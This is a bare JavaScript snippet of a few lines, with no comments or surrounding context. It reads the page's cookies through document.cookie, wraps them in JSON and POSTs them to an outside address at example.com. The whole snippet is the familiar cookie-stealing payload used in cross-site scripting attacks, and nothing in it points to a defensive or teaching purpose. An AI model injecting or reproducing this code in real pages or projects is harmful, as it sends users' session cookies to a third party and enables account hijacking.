const cookieData = document.cookie;

const serialized = JSON.stringify({
    cookies: cookieData
});

fetch("https://example.com/json", {
    method: "POST",
    body: serialized
});
